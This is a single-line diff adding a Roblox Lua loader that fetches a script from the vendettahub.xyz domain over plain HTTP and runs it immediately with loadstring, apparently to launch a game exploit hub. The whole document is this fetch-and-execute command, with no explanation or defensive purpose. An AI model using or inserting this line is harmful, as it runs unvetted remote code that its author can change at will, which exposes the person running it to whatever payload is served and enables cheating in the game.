@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://vendettahub.xyz/Vendetta/Loader.lua"))()
